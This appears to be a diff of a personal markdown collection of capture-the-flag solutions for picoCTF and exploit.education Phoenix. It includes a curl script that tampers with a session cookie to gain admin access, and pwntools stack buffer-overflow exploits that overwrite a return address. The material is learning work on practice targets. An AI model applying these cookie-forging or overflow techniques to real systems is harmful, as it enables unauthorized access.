@@ -76,14 +76,16 @@ x_send(msg)
 print(conn.recvall().strip().split()[-1].decode())
 ```
 
-Solves [picoctf#152](https://play.picoctf.org/practice/challenge/152)
----------------------------------------------------------------------
-
--	webassembly
--	wasm
+Solves [picoctf#46](https://play.picoctf.org/practice/challenge/46)
+-------------------------------------------------------------------
 
 ```bash
-curl -s http://mercury.picoctf.net:37669/JIFxzHyW8W | wasm-decompile - | grep 'picoCTF{' | tr -d '";' | head -c -7; echo
+#!/bin/bash
+
+curl -sLX POST -c cookies.txt -b cookies.txt -d 'user=&password=' 'https://jupiter.challenges.picoctf.org/problem/44573/login' > /dev/null
+sed -i 's/False$/True/' cookies.txt
+curl -sL -c cookies.txt -b cookies.txt 'https://jupiter.challenges.picoctf.org/problem/44573/flag' | hq code text
+rm cookies.txt
 ```
 
 Solves [picoctf#105](https://play.picoctf.org/practice/challenge/105)
@@ -116,65 +118,10 @@ for octets in [ extract[i:i+8] for i in range(0, len(extract), 8) ]:
     print(octets, "✖")
 ```
 
-Solves [exploit-education#1](https://exploit.education/phoenix/stack-one/)
---------------------------------------------------------------------------
+Solves [picoctf#112](https://play.picoctf.org/practice/challenge/112)
+---------------------------------------------------------------------
 
-Template for feeding a process in search of the right output.
-
-```python
-#!/bin/python
-
-from pwn import *
-import struct
-
-probes = [
-    'a.out: specify an argument, to be copied into the "buffer"',
-    'Getting closer! changeme is currently 0x00000000, we want 0x496c5962',
-    'Getting closer! changeme is currently 0x00000049, we want 0x496c5962',
-    'Getting closer! changeme is currently 0x0000496c, we want 0x496c5962',
-    'Getting closer! changeme is currently 0x00496c59, we want 0x496c5962',
-]
-target = struct.pack("I", 0x496c5962)
-result = probes[0]
-cmpt = 0
-
-while result in probes:
-    payload = b"a" * cmpt + target
-    conn = process(['./a.out', payload])
-    conn.readline()
-    result = conn.readline().decode().strip()
-    cmpt += 1
-    print(result)
-    print(cmpt, payload)
-```
-
-Solves [exploit-education#3 and exploit-education#4](https://exploit.education/phoenix/stack-three/)
-----------------------------------------------------------------------------------------------------
-
-```python
-#!/bin/python
-
-from pwn import *
-import struct
-
-conn = process('./a.out')
-payload = cyclic(100)
-print(conn.recvline())
-conn.sendline(payload)
-extract = conn.recvline().decode().strip().split('x')[1]
-offset = cyclic_find(bytes.fromhex(extract).decode()[:4])
-
-e = ELF('./a.out')
-print(hex(e.symbols['complete_level']))
-target = p32(e.symbols['complete_level'])
-
-payload = cyclic(offset - 1) + target
-conn = process('./a.out')
-print(conn.recvline().decode())
-conn.sendline(payload)
-print(conn.recvline().decode())
-print(conn.recvline().decode())
-```
+I wrote a [BMP patcher](https://gist.github.com/0b11stan/63024db70c2766ee27ca7803b9634896).
 
 Solves [picoctf#115](https://play.picoctf.org/practice/challenge/115)
 ---------------------------------------------------------------------
@@ -236,4 +183,87 @@ if '__main__' == __name__:
         usage(sys.argv[0])
     else:
         main(sys.argv[1].strip())
+```
+
+Solves [picoctf#152](https://play.picoctf.org/practice/challenge/152)
+---------------------------------------------------------------------
+
+-	webassembly
+-	wasm
+
+```bash
+curl -s http://mercury.picoctf.net:37669/JIFxzHyW8W | wasm-decompile - | grep 'picoCTF{' | tr -d '";' | head -c -7; echo
+```
+
+Solves [picoctf#262](https://play.picoctf.org/practice/challenge/262)
+---------------------------------------------------------------------
+
+Find specific CVE's in time :
+
+```bash
+grep -ri 'windows print spooler Remote Code Execution' \
+  | cut -d ':' -f 1 | cut -d '/' -f 2 | cut -d '.' -f 1 \
+  | xargs -I '@' sh -c \
+    "printf '@ ' && curl -s https://cve.mitre.org/cgi-bin/cvename.cgi?name=@ | hq '#GeneratedTable > table > tbody > tr:nth-child(11) > td:nth-child(1) > b' text" \
+  | sort -k2 | head -n 1
+```
+
+Solves [exploit-education#1](https://exploit.education/phoenix/stack-one/)
+--------------------------------------------------------------------------
+
+Template for feeding a process in search of the right output.
+
+```python
+#!/bin/python
+
+from pwn import *
+import struct
+
+probes = [
+    'a.out: specify an argument, to be copied into the "buffer"',
+    'Getting closer! changeme is currently 0x00000000, we want 0x496c5962',
+    'Getting closer! changeme is currently 0x00000049, we want 0x496c5962',
+    'Getting closer! changeme is currently 0x0000496c, we want 0x496c5962',
+    'Getting closer! changeme is currently 0x00496c59, we want 0x496c5962',
+]
+target = struct.pack("I", 0x496c5962)
+result = probes[0]
+cmpt = 0
+
+while result in probes:
+    payload = b"a" * cmpt + target
+    conn = process(['./a.out', payload])
+    conn.readline()
+    result = conn.readline().decode().strip()
+    cmpt += 1
+    print(result)
+    print(cmpt, payload)
+```
+
+Solves [exploit-education#3 and exploit-education#4](https://exploit.education/phoenix/stack-three/)
+----------------------------------------------------------------------------------------------------
+
+```python
+#!/bin/python
+
+from pwn import *
+import struct
+
+conn = process('./a.out')
+payload = cyclic(100)
+print(conn.recvline())
+conn.sendline(payload)
+extract = conn.recvline().decode().strip().split('x')[1]
+offset = cyclic_find(bytes.fromhex(extract).decode()[:4])
+
+e = ELF('./a.out')
+print(hex(e.symbols['complete_level']))
+target = p32(e.symbols['complete_level'])
+
+payload = cyclic(offset - 1) + target
+conn = process('./a.out')
+print(conn.recvline().decode())
+conn.sendline(payload)
+print(conn.recvline().decode())
+print(conn.recvline().decode())
 ```
